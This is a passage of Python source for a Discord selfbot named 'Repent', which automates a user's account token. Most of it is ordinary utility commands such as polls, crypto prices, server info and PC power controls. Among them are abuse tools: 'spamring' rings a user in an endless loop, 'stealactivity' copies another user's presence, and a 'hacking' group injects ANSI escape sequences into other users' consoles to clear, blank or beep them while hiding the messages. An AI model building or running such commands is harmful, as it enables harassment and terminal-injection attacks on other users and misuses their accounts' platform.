@Repent.command(aliases = ["cls", "clear"], description=f"Clears the console. \nUsage: {config_get('prefix')}clearcons", help="utility")
async def clearcons(ctx):    
    clear_console()
    terminalui()
    heading = "Clear Console"
    body = "Console has been cleared!"
    cmdname = "clearcons"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Sends a temp email link. \nUsage: {config_get('prefix')}tempmail", help="utility")
async def tempmail(ctx):    
    await ctx.send(f'https://www.tempinbox.xyz/mailbox/{random.randint(0, 8)}@tempinbox.xyz')

@Repent.command(description=f"Generates a random name. \nUsage: {config_get('prefix')}genname", help="utility")
async def genname(ctx):    
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))

@Repent.command(description=f"Displays info about a user. \nUsage: {config_get('prefix')}whois <@user>", help="utility")
async def whois(ctx, member: Union[discord.Member, discord.User] = None):   
    async def get_mutual_guilds(member, guild):
        try:
            if await guild.fetch_member(member.id) is not None:
                return guild.name
        except discord.NotFound:
            pass
    mutual_guilds = []
    tasks = [get_mutual_guilds(member, guild) for guild in Repent.guilds]
    results = await asyncio.gather(*tasks)
    mutual_guilds.extend(filter(None, results))
    mutual_servers = '\n'.join(mutual_guilds) if mutual_guilds else "None"
    if isinstance(ctx.channel, discord.TextChannel):  
        if member is None:
            member = ctx.message.author
        heading = f"Who Is {member.display_name}"
        body = f"ID: {member.id}\nCreated Account On: {member.created_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')}\nJoined Server On: {member.joined_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')}\nFlags: {member.public_flags.value}\nHighest Role: {member.top_role}\nMutual Servers: \n{mutual_servers}"
    else:  
        if member is None:
            member = ctx.message.author
        heading = f"Who Is {member.display_name}"
        body = f"ID: {member.id}\nCreated Account On: {member.created_at.strftime('%a, %#d %B %Y, %I:%M %p UTC')}\nFlags: {member.public_flags.value}\nMutual Servers: \n{mutual_servers}"
    cmdname = "whois"
    await panelmaker(ctx, heading, body, cmdname, target_user=member)

@Repent.command(description=f"Sends a user's PFP. \nUsage: {config_get('prefix')}av <@user>", help="utility")
async def av(ctx, *, user: discord.User = Repent.user):
    format = "gif"
    if not user.avatar.is_animated():
        format = "png"
    avatar = user.avatar.replace(format=format if format != "gif" else None)
    await apiimg(ctx, avatar)

@Repent.command(description=f"Turns text into ASCII art. \nUsage: {config_get('prefix')}ascii <text>", help="utility")
async def ascii(ctx, *text):        
        try:
            f = pyfiglet.Figlet(font='standard')
        except pyfiglet.FontNotFound:
            return
        r = f.renderText(" ".join(text))
        if len(r) > 2000:
            await ctx.send("```Too many characters```", delete_after=5)
            return
        await ctx.send(f"```{r}```")

@Repent.command(description=f"Sends a blank message. \nUsage: {config_get('prefix')}emptymsg", help="utility")
async def emptymsg(ctx):     
    await ctx.send(chr(173))

@Repent.command(description=f"Displays bitcoin prices. \nUsage: {config_get('prefix')}btc", help="utility")
async def btc(ctx):     
    r = (await arequesters.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,GBP'))
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    heading = "Bitcoin"
    body = f"USD: ${str(usd)}\nEUR: €{str(eur)}\nGBP: £{str(gbp)}"
    cmdname = "btc"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Displays etherium prices. \nUsage: {config_get('prefix')}eth", help="utility")
async def eth(ctx):     
    r = (await arequesters.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR,GBP'))
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    heading = "Etherium"
    body = f"USD: ${str(usd)}\nEUR: €{str(eur)}\nGBP: £{str(gbp)}"
    cmdname = "eth"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Displays litecoin prices. \nUsage: {config_get('prefix')}ltc", help="utility")
async def ltc(ctx):     
    r = (await arequesters.get('https://min-api.cryptocompare.com/data/price?fsym=LTC&tsyms=USD,EUR,GBP'))
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    heading = "Litecoin"
    body = f"USD: ${str(usd)}\nEUR: €{str(eur)}\nGBP: £{str(gbp)}"
    cmdname = "ltc"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Displays dogecoin prices. \nUsage: {config_get('prefix')}dogecoin", help="utility")
async def dogecoin(ctx):     
    r = (await arequesters.get('https://min-api.cryptocompare.com/data/price?fsym=DOGE&tsyms=USD,EUR,GBP'))
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    gbp = r['GBP']
    heading = "Dogecoin"
    body = f"USD: ${str(usd)}\nEUR: €{str(eur)}\nGBP: £{str(gbp)}"
    cmdname = "dogecoin"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Sends a server's PFP. \nUsage: {config_get('prefix')}serverpfp", help="utility")
async def serverpfp(ctx):     
    await ctx.send(ctx.guild.icon.replace(format="png", size=1024))

@Repent.command(description=f"Creates a poll. \nUsage: {config_get('prefix')}poll <question>", help="utility")
async def poll(ctx, *, question: str="Repent"):    
    heading = "Poll"
    body = question
    cmdname = "poll"
    message = await panelmaker(ctx, heading, body, cmdname)
    message
    options = {'\N{THUMBS UP SIGN}',
              '\N{THUMBS DOWN SIGN}'}
    for choice in options:
        await message.add_reaction(emoji=choice)

@Repent.command(description=f"Creates a discord embedded poll with multiple options. \nUsage: {config_get('prefix')}multipoll <question> <duartion (1-336 (hours))> \n<option> <emoji> (up to 10 options)", help="utility")
async def multipoll(ctx, question, duration, *options_and_emojis: str): 
    if len(options_and_emojis) < 2 or len(options_and_emojis) % 2 != 0 or len(options_and_emojis) > 20:
        heading = "ERROR"
        body = "Please provide between 1 and 10 options with emojis."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    try: 
        int(duration)
    except:
        duration=24
    options = options_and_emojis[::2]
    emojis = options_and_emojis[1::2]

    options_pairs = list(zip(options, emojis))

    url = f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages"
    headers = {
        "authorization": config_get('token'),
        "x-super-properties": getxsuper()
    }
    json_data = {
        "content": "",
        "tts": False,
        "poll": {
            "question": {"text": question},
            "duration": duration,
            "layout_type": 1,
            "allow_multiselect": False,
            "answers": []
        }
    }
    for option, emoji in options_pairs[:10]:
        if (emoji.startswith('<:') or emoji.startswith('<a:')) and emoji.endswith('>'):
            parts = emoji.split(':')
            if len(parts) == 3:
                emoji_id = parts[2].replace('>', '')
                json_data["poll"]["answers"].append({"poll_media": {"text": option, "emoji": {"id": f"{emoji_id}", "name": ""}}})
            else:
                continue
        else:
            json_data["poll"]["answers"].append({"poll_media": {"text": option, "emoji": {"name": emoji}}})

    print(json_data)
    req = (await arequesters.post(url=url, headers=headers, json_data=json_data))
    print(req.status_code)
    print(req.text)

@Repent.command(description=f"Created an embedded discord poll with yes or no answers. \nUsage: {config_get('prefix')}dpoll [length of poll in hours] [question]", help="utility")
async def dpoll(ctx, duration: typing.Optional[int]=24, *,question: str="Repent"):
    url = f"https://discord.com/api/v9/channels/{ctx.channel.id}/messages"
    headers = {
        "authorization": config_get('token'),
        "x-super-properties": getxsuper()
        }
    json_data = {
        "content": "",
        "tts": False,
        "poll": {
            "question": {"text": question},
            "duration": duration,
            "layout_type": 1,
            "allow_multiselect": False,
            "answers": [{"poll_media": {"text": "Yes", "emoji": {"name": "✅"}}}, {"poll_media": {"text": "No", "emoji": {"name": "❌"}}}]
        }
    }

    (await arequesters.post(url=url, headers=headers, json_data=json_data))

@Repent.command(description=f"Enables Dev Tools on Discord app. \nUsage: {config_get('prefix')}devtools", help="utility")
async def devtools(ctx):
    os_name = platform.system()

    if os_name == "Windows":
        pcname = os.getlogin()
        settings_path = f"C://Users//{pcname}//Appdata//Roaming//discord//settings.json"
    elif os_name == "Darwin":
        pcname = os.getlogin()
        settings_path = f"/Users/{pcname}/Library/Application Support/discord/settings.json"
    elif os_name == "Linux":
        pcname = os.getlogin()
        settings_path = f"/home/{pcname}/.config/discord/settings.json"
    else:
        await ctx.send("Unsupported operating system.")
        return

    try:
        with open(settings_path, "r", encoding="utf-8") as json_file:
            data = json.load(json_file)

        if "DANGEROUS_ENABLE_DEVTOOLS_ONLY_ENABLE_IF_YOU_KNOW_WHAT_YOURE_DOING" not in data:
            data["DANGEROUS_ENABLE_DEVTOOLS_ONLY_ENABLE_IF_YOU_KNOW_WHAT_YOURE_DOING"] = True

            with open(settings_path, 'w', encoding="utf-8") as json_file:
                json.dump(data, json_file, indent=4)

        heading = "Dev Tools"
        body = "Discord Dev Tools have been enabled!"
        cmdname = "devtools"
        await panelmaker(ctx, heading, body, cmdname)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@Repent.command(aliases=["guildinfo"], description=f"Displays info about a server. \nUsage: {config_get('prefix')}serverinfo", help="utility")
async def serverinfo(ctx):    
    owner = str(ctx.guild.owner)[:-2] if ctx.guild.owner else "Could Not Determine Owner"
    date_format = "%a, %d %b %Y %I:%M %p"
    heading = f"Info on {ctx.guild.name}"
    body = f"Server Owner: {owner}\nServer ID: {ctx.guild.id}\nServer Created At: {ctx.guild.created_at.strftime(date_format)}\nMembers: {(ctx.guild.member_count)}\nRoles: {len(ctx.guild.roles)}\nText Channels: {len(ctx.guild.text_channels)}\nVoice Channels: {len(ctx.guild.voice_channels)}\nCategories: {len(ctx.guild.categories)}"
    cmdname = "serverinfo"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Displays info about a server. \nUsage: {config_get('prefix')}getroles", help="utility")
async def getroles(ctx):    
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    heading = f"{ctx.guild.name} Roles"
    body = roleStr
    await ctx.send(f"```{heading}\n\n{body}```")

@Repent.command(description=f"Shuts down the bot. \nUsage: {config_get('prefix')}shutdown", help="utility")
async def shutdown(ctx):    
    os._exit(0)

@Repent.command(description=f"Cleans the last few embeds sent by the bot before the deltimer occurs. \nUsage: {config_get('prefix')}cleanup", help="utility")
async def cleanup(ctx):   
    messages = await ctx.channel.history(limit=15).flatten()
    count_deleted = 0
    for message in messages:
        if count_deleted >= 7:
            break
        if message.author == Repent.user and ">" in message.content:
            await message.delete()
            count_deleted += 1
    clean_message = await ctx.send("**All clean!**")
    await asyncio.sleep(3)
    await clean_message.delete()

@Repent.command(description=f"Adds 2 numbers together. \nUsage: {config_get('prefix')}add <number1> <number2>", help="utility")
async def add(ctx,a:float,b:float):    
    await ctx.send(f"```{a}+{b}={a+b}```")

@Repent.command(description=f"Subtracts a number from another. \nUsage: {config_get('prefix')}subtract <number1> <number2>", help="utility")
async def subtract(ctx,a:float,b:float):    
    await ctx.send(f"```{a}-{b}={a-b}```")

@Repent.command(description=f"Multiplies 2 numbers together. \nUsage: {config_get('prefix')}multiply <number1> <number2>", help="utility")
async def multiply(ctx,a:float,b:float):    
    await ctx.send(f"```{a}x{b}={a*b}```")

@Repent.command(description=f"Divides a number by the other. \nUsage: {config_get('prefix')}divide <number1> <number2>", help="utility")
async def divide(ctx,a:float,b:float):    
    await ctx.send(f"```{a}÷{b}={a/b}```")

@Repent.command(description=f"Converts a fraction to a decimal. \nUsage: {config_get('prefix')}fractodec <numerator> <denominator>", help="utility")
async def fractodec(ctx, numerator: int, denominator: int):   
    res = numerator / denominator
    await ctx.send(f"```{numerator} Over {denominator}={res}```")

@Repent.command(description=f"Converts a decimal to a fraction. \nUsage: {config_get('prefix')}dectofrac <decimal>", help="utility")
async def dectofrac(ctx, n: float):    
    res = Fraction(n)
    await ctx.send(f"```{n} as a fraction is {res}```")

@Repent.command(description=f"Steals another discord users rich presence. \nUsage: {config_get('prefix')}stealactivity <@user>", help="utility")
async def stealactivity(ctx, member: discord.User):
    global fetchedactivity
    req = (await arequesters.get(f"https://discord.com/api/v9/users/{member.id}/profile?with_mutual_guilds=true", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()})).json()
    if not req.get("mutual_guilds"):
        heading = "Error"
        body = "You have no mutual guilds with this user and so cannot get their presence data."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    guildid = req["mutual_guilds"][0]["id"]
    guild = await Repent.fetch_guild(int(guildid))
    member = await guild.query_members(limit=1, user_ids=[f'{member.id}'], presences=True, cache=False)
    if fetchedactivity == "[]":
        heading = "Error"
        body = "User has no activity currently."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    ws = get_websocket()
    req = (await arequesters.get("https://discord.com/api/v9/users/@me/settings-proto/1", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()})).json()
    settings = base64.b64decode(req['settings']).decode('utf-8', errors='ignore')
    if "invisible" in settings:
        Status = "dnd"
    elif "online" in settings:
        Status = "online"
    elif "idle" in settings:
        Status = "idle"
    else:
        Status = "dnd"
    jasondata = {"op": 3, "d":{"status": Status, "since": 0, "activities": json.loads(fetchedactivity), "afk": True}}
    await ws.send_as_json(jasondata)
    fetchedactivity = ""
    heading = "Activity Stolen!"
    body = "Successfully taken and applied stolen activity."
    cmdname = "stealactivity"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Sends a users activity json. \nUsage: {config_get('prefix')}getactivity <@user>", help="utility")
async def getactivity(ctx, user: discord.User):
    global fetchedactivity
    req = (await arequesters.get(f"https://discord.com/api/v9/users/{user.id}/profile?with_mutual_guilds=true", headers={"Authorization": config_get('token'), "x-super-properties": getxsuper()})).json()
    if not req.get("mutual_guilds"):
        heading = "Error"
        body = "You have no mutual guilds with this user and so cannot get their presence data."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    guildid = req["mutual_guilds"][0]["id"]
    guild = await Repent.fetch_guild(int(guildid))
    await guild.query_members(limit=1, user_ids=[f'{user.id}'], presences=True, cache=False)
    if fetchedactivity == "[]":
        heading = "Error"
        body = "User has no activity currently."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
        return
    else:
        def split_message(text, max_length=1900):
            if isinstance(text, (dict, list)):
                text = json.dumps(text, indent=2)
            messages = []
            current_chunk = ""
            lines = text.splitlines()  
            for line in lines:
                if len(current_chunk) + len(line) + 1 > max_length:
                    messages.append(current_chunk)
                    current_chunk = line
                else:
                    if current_chunk:
                        current_chunk += "\n"
                    current_chunk += line
            if current_chunk:
                messages.append(current_chunk)
            
            return messages
        if len(fetchedactivity) > 2000:
            messasges = split_message(fetchedactivity)
            for message in messasges:
                await ctx.send(f"```{message}```")
        else:
            await ctx.send(f"```{fetchedactivity}```")
        fetchedactivity = ""

@Repent.command(description=f"Spam Rings a user. \nUsage: {config_get('prefix')}spamring <@user>")
async def spamring(ctx, user: discord.User):
    chanid = ctx.channel.id
    payload = {"recipients": [f"{user.id}"]}
    while True:
        (await arequesters.post(f"https://discord.com/api/v9/channels/{chanid}/call/ring", headers={'Authorization': config_get('token'), "x-super-properties": getxsuper()}, json_data=payload))

@Repent.command(description=f"Clones a server. \nUsage: {config_get('prefix')}cloneserver", help="utility")
async def cloneserver(ctx):
    try:
        source_guild = ctx.guild
        source_guild_name = source_guild.name
        icon_url = source_guild.icon

        icon_bytes = None
        if icon_url:
            response = requested.get(icon_url)
            icon_bytes = BytesIO(response.content)

        new_guild_data = await make_server(name=source_guild_name, icon=icon_bytes.read()) if icon_bytes else await make_server(name=source_guild_name)

        if isinstance(new_guild_data, dict):
            new_guild = Repent.get_guild(int(new_guild_data['id']))
        else:
            new_guild = new_guild_data
        
        if not new_guild:
            try:
                await asyncio.sleep(2)
                new_guild = Repent.get_guild(int(new_guild_data['id'])) if isinstance(new_guild_data, dict) else new_guild
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}Failed to fetch the newly created guild and cannot continue, please try again.")
                return

        channels = [channel.id for channel in new_guild.channels]
        for channel in channels:
            try:
                chan = Repent.get_channel(channel)
                await chan.delete()
            except:
                try:
                    chan = Repent.get_channel(channel)
                    await chan.delete()
                except:
                    print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}Unable to delete default channels in cloned server, you will have to do this manually.")

        new_roles = {}
        for role in sorted(source_guild.roles, reverse=True):
            if role.name != "@everyone":
                created_role = await new_guild.create_role(
                    name=role.name,
                    permissions=role.permissions,
                    color=role.color,
                    hoist=role.hoist,
                    mentionable=role.mentionable
                )
                new_roles[role.id] = created_role

        new_categories = {}
        for category in source_guild.categories:
            created_category = await new_guild.create_category_channel(
                name=category.name,
                position=category.position
            )
            new_categories[category.id] = created_category

        for channel in source_guild.channels:
            overwrites = {}
            for target, overwrite in channel.overwrites.items():
                if target.id in new_roles:
                    overwrites[new_roles[target.id]] = overwrite

            category = new_categories.get(channel.category.id) if channel.category else None
            if isinstance(channel, discord.TextChannel):
                try:
                    await new_guild.create_text_channel(
                        name=channel.name,
                        position=channel.position,
                        category=category,
                        overwrites=overwrites
                    )
                except:
                    pass
            elif isinstance(channel, discord.VoiceChannel):
                try:
                    await new_guild.create_voice_channel(
                        name=channel.name,
                        position=channel.position,
                        category=category,
                        overwrites=overwrites
                    )
                except:
                    pass
        heading = "Cloning Successful!"
        body = f"{source_guild_name} cloned successfully!"
        cmdname = "cloneserver"
        await panelmaker(ctx, heading, body, cmdname)

    except Exception as e:
        import traceback
        error_details = traceback.format_exc()
        print(f"[Error]: {error_details}")
        await send_webhook("Clone Server Error", f"An error occurred while cloning the server: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url'))
        heading = "Error"
        body = str(e)
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Add a custom alias for a command. \nUsage: {config_get('prefix')}alias <command name> <alias>", help="utility")
async def alias(ctx, command_name: str, alias: str):
        heading, body, cmdname = check_and_add_alias(command_name, alias)
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Deletes a custom alias. \nUsage: {config_get('prefix')}delalias <alias>", help="utility")
async def delalias(ctx, alias):
    heading, body, cmdname = check_and_remove_alias(alias)
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Lists all custom aliases. \nUsage: {config_get('prefix')}listaliases", help="utility")
async def listaliases(ctx):
    with open("data//Settings//Configs//aliases.json", "r") as file:
        aliases = json.load(file)
    
    if not aliases:
        heading = "Error"
        body =  "No custom aliases found."
        cmdname = "ERROR"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        result = "Custom Aliases:\n\n"
        for command_name, alias_list in aliases.items():
            result += f"Command: {command_name}\n"
            result += "Aliases: " + ", ".join(alias_list) + "\n\n"
        
        await ctx.send(f"```{result.strip()}```", delete_after=int(config_get('delete_timer')))

@Repent.command(description=f"Adds a discord bot to the list of bots to be giveaway sniped. \nUsage: {config_get('prefix')}gwbot <id of bot>", help="utility")
async def gwbot(ctx, id):
    with open(CONFIG_FILE, 'r') as file:
        data = json.load(file)
    if 'giveaway_bot_ids' not in data:
        data['giveaway_bot_ids'] = []
    if int(id) in data['giveaway_bot_ids']:
        data['giveaway_bot_ids'].remove(int(id))
        heading = "ID Removed"
        body = f"Bot with ID '{id}' was removed from the giveaway sniper."
    else:
        data['giveaway_bot_ids'].append(int(id))
        heading = "ID Added"
        body = f"Bot with ID '{id}' was added to the giveaway sniper."
    cmdname = "gwbot"
    await panelmaker(ctx, heading, body, cmdname)
    with open(CONFIG_FILE, 'w') as file:
        json.dump(data, file, indent=4)

@Repent.command(description=f"Blacklists a server from the giveaway bot. \nUsage: {config_get('prefix')}gwblacklist <server id>", help="utility")
async def gwblacklist(ctx, id):
    with open(CONFIG_FILE, 'r') as file:
        data = json.load(file)
    if 'giveaway_blacklist_ids' not in data:
        data['giveaway_blacklist_ids'] = []
    if int(id) in data['giveaway_blacklist_ids']:
        data['giveaway_blacklist_ids'].remove(int(id))
        heading = "Server Whitelisted"
        body = f"Server with ID '{id}' was whitelisted for the giveaway sniper."
    else:
        data['giveaway_blacklist_ids'].append(int(id))
        heading = "Server Blacklisted"
        body = f"server with ID '{id}' was blacklisted from the giveaway sniper."
    cmdname = "gwblacklist"
    await panelmaker(ctx, heading, body, cmdname)
    with open(CONFIG_FILE, 'w') as file:
        json.dump(data, file, indent=4)
        
@Repent.command(description=f"Changes the delay of the giveaway sniper. \nUsage: {config_get('prefix')}gdelay <delay in seconds>", help="utility")
async def gdelay(ctx, delay):
    config_edit("giveaway_delay", delay)
    heading = "Delay Updated"
    body = f"Giveaway sniper delay updated to {delay} seconds."
    cmdname = "gdelay"
    await panelmaker(ctx, heading, body, cmdname)
    
@Repent.command(description=f"Changes the device the bot is set as \nUsage: {config_get('prefix')}device <device>\nDevices: desktop, mobile, web, console", help="utility")
async def device(ctx, device):
    devices = ["console", "web", "desktop", "mobile"]
    if device.lower() in devices:
        config_edit("device", device)
        heading = "Device Updated"
        body = f"Bot device changed to {device.lower()}"
        cmdname = "device"
        await panelmaker(ctx, heading, body, cmdname)
        try:
            os_name = platform.system()
            if os_name == 'Windows':
                os.startfile("Repent.exe")
                os._exit(1)
            elif os_name in ['Darwin', 'Linux']:
                os.system("./Repent.bin")
            else:
                raise NotImplementedError("Unsupported operating system")
            os._exit(1)
        except (FileNotFoundError, NotImplementedError):
            os.system("python Repent.py")
            os._exit(1)
        except Exception as e:
            pass
    else:
        heading = "Invalid Device"
        body = f"Please use a valid device type.\nDevices: desktop, mobile, web, console"
        cmdname = "device"
        await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Blacklists a server from the nitro sniper. \nUsage: {config_get('prefix')}nitroblacklist [server id]", help="utility")
async def nitroblacklist(ctx, id=None):
    if id == None:
        id = ctx.guild.id
    with open(CONFIG_FILE, 'r') as file:
        data = json.load(file)
    if 'nitro_blacklist_ids' not in data:
        data['nitro_blacklist_ids'] = []
    if int(id) in data['nitro_blacklist_ids']:
        data['nitro_blacklist_ids'].remove(int(id))
        heading = "Server Whitelisted"
        body = f"Server with ID '{id}' was whitelisted for the nitro sniper."
    else:
        data['nitro_blacklist_ids'].append(int(id))
        heading = "Server Blacklisted"
        body = f"server with ID '{id}' was blacklisted from the nitro sniper."
    cmdname = "nitroblacklist"
    await panelmaker(ctx, heading, body, cmdname)
    with open(CONFIG_FILE, 'w') as file:
        json.dump(data, file, indent=4)

@Repent.command(description=f"Shuts down the PC immediately. \nUsage: {config_get('prefix')}shutdownpc", help="utility")
async def shutdownpc(ctx):
    os.system('shutdown /s /t 0')
    heading = "Shutdown Initiated!"
    body = "PC will shut down immediately."
    cmdname = "shutdown"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Puts the PC into hibernation immediately. (This requires Hibernation enabled on your PC) \nUsage: {config_get('prefix')}hibernatepc", help="utility")
async def hibernatepc(ctx):
    os.system('shutdown /h')
    heading = "Hibernation Initiated!"
    body = "PC will enter hibernation immediately."
    cmdname = "hibernate"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Puts the PC to sleep immediately. \nUsage: {config_get('prefix')}sleeppc", help="utility")
async def sleeppc(ctx):
    os.system('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
    heading = "Sleep Mode Activated!"
    body = "PC will go to sleep immediately."
    cmdname = "sleep"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Locks the PC immediately. \nUsage: {config_get('prefix')}lockpc", help="utility")
async def lockpc(ctx):
    os.system('rundll32.exe user32.dll,LockWorkStation')
    heading = "PC Lock Initiated!"
    body = "PC has been locked."
    cmdname = "lock"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Restarts the PC immediately. \nUsage: {config_get('prefix')}restartpc", help="utility")
async def restartpc(ctx):
    os.system('shutdown /r /t 0')
    heading = "Restart Initiated!"
    body = "PC will restart immediately."
    cmdname = "restart"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description = f"Gets someones Xbox UID from their username. \nUsage: {config_get('prefix')}xuid <username>", help="utility")
async def xuid(ctx, *,username):
    username = urlify(username)
    resp = (await arequesters.get(f"http://192.9.186.202:3113/profile/gt/{username}"))
    if resp.text == "null":
        heading = "Could Not Get XUID"
        body = "Username is probably incorrect."
        cmdname = "xuid"
    else:
        try:
            heading = f"XUID For {username}"
            body = resp.json()['profileUsers'][0]['id']
            cmdname = "xuid"
        except:
            heading = "Could Not Get XUID"
            body = "Username is probably incorrect."
            cmdname = "xuid"
    await panelmaker(ctx, heading, body, cmdname)

@Repent.command(description=f"Creates a backup of your favourite gifs. \nUsage {config_get('prefix')}backupgifs", help="utility")
async def backupgifs(ctx):
    url = "https://discord.com/api/v9/users/@me/settings-proto/2"
    headers = {
        "Authorization": config_get('token'),
        "X-Super-Properties": getxsuper()
    }
    req = (await arequesters.get(url, headers))
    data = req.json()
    settings_key = data['settings']
    decoded_data = base64.b64decode(settings_key)
    settings = FrecencyUserSettings()
    settings = settings.FromString(decoded_data)
    favorite_gifs_data = settings.favorite_gifs
    favorite_gifs_dict = MessageToDict(favorite_gifs_data)
    with open('data/Backups/favorite_gifs.txt', 'w') as f:
        json.dump(favorite_gifs_dict, f, indent=4)
    heading = "Gifs Successfully Backed-Up"
    body = "Favourite gifs have been backed up to 'data/Backups/favorite_gifs.txt'"
    cmdname = "backupgifs"
    await panelmaker(ctx,heading,body,cmdname)

@Repent.command(description=f"Imports your favourite gifs to your account using backed-up gifs from the backupgifs cmd. \nUsage: {config_get('prefix')}importgifs")
async def importgifs(ctx):
    async def getsettings():
        url = "https://discord.com/api/v9/users/@me/settings-proto/2"
        headers = {
            "Authorization": config_get('token'),
            "X-Super-Properties": getxsuper(),
            "Content-Type": "application/json"
        }
        req = (await arequesters.get(url, headers=headers))
        data = req.json()
        settings_key = data['settings']
        decoded_data = base64.b64decode(settings_key)
        settings = FrecencyUserSettings()
        settings.ParseFromString(decoded_data)
        return MessageToDict(settings)
    def add_missing_gifs(settings_dict, favorite_gifs_dict):
        settings_gifs = settings_dict.get('favoriteGifs', {}).get('gifs', {})
        favorite_gifs = favorite_gifs_dict.get('favoriteGifs', {}).get('gifs', {})
        missing_gifs = {url: gif_data for url, gif_data in favorite_gifs.items() if url not in settings_gifs}
        for url, gif_data in missing_gifs.items():
            existing_key = next((key for key, value in settings_gifs.items() if value['src'] == gif_data['src']), None)
            if existing_key:
                settings_gifs[existing_key] = {
                    'format': gif_data['format'],
                    'src': gif_data['src'],
                    'width': gif_data.get('width'),
                    'height': gif_data.get('height'),
                    'order': len(settings_gifs) + 1
                }
            else:
                settings_gifs[url] = {
                    'format': gif_data['format'],
                    'src': gif_data['src'],
                    'width': gif_data.get('width'),
                    'height': gif_data.get('height'),
                    'order': len(settings_gifs) + 1
                }
        settings_dict['favoriteGifs']['gifs'] = settings_gifs
        return settings_dict
    settings = await getsettings()
    frecency = FrecencyUserSettings()
    with open('data/Backups/favorite_gifs.txt', 'r') as file:
        content = json.load(file)
    content = {"favoriteGifs": content}
    updated_settings = add_missing_gifs(settings, content)
    ParseDict(updated_settings, frecency)
    serialized_data = frecency.SerializeToString()
    encoded_content = base64.b64encode(serialized_data).decode()
    jsondata = {"settings": f"{encoded_content}"}
    req = (await arequesters.patch("https://discord.com/api/v9/users/@me/settings-proto/2", headers={"Authorization": config_get('token'), "X-Super-Properties": getxsuper(), "Content-Type": "application/json"}, json_data=jsondata))

    heading = "Successfully Imported Gifs"
    body = "All gifs have been imported!"
    cmdname = "importgifs"
    await panelmaker(ctx,heading,body,cmdname)

@Repent.command(description=f"Clears someones console. \nUsage: {config_get('prefix')}injectclear [@user]", help="hacking")
async def injectclear(ctx, user: discord.User = None):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \033c'
    await ctx.send(f'{code}', delete_after=0)

@Repent.command(description=f"Scrolls someones console up. \nUsage: {config_get('prefix')}injectscrollup [@user] [amount to scroll up by]", help="hacking")
async def injectscrollup(ctx, user: typing.Optional[discord.User] = None, amount=50):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \033[{amount}S'
    await ctx.send(f'{code}', delete_after=0)

@Repent.command(description=f"Scrolls someones console down. \nUsage: {config_get('prefix')}injectscrolldown [@user] [amount to scroll down by]", help="hacking")
async def injectscrolldown(ctx, user: typing.Optional[discord.User] = None, amount=50):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \033[{amount}T'
    await ctx.send(f'{code}', delete_after=0)

@Repent.command(description=f"Turns someones console fully white. \nUsage: {config_get('prefix')}injectchaos [@user]", help="hacking")
async def injectchaos(ctx, user: discord.User = None):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'''{user_mention} \x1b[7m\x1b[2J\x1b[15;D\x1b[0m'''
    await ctx.send(f'{code}', delete_after=0)

@Repent.command(description=f"Prints invisible text in someones console. \nUsage: {config_get('prefix')}injectinvistext [@user] [invis text]", help="hacking")
async def injectinvistext(ctx, user: typing.Optional[discord.User] = None, *, message="Repent"):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \033[30m{message}'
    await ctx.send(f'{code}', delete_after=0)

@Repent.command(description=f"Triggers a windows alert sound from their console. \nUsage: {config_get('prefix')}injectalert [@user] [number of alerts]", help="hacking")
async def injectalert(ctx, user: typing.Optional[discord.User] = None, amount=1):
    if user is not None:
        user_mention = user.mention
    else:
        user_mention = ""
    code = f'{user_mention} \007'
    for i in range(0, int(amount)):
        await ctx.send(f'{code}', delete_after=0)

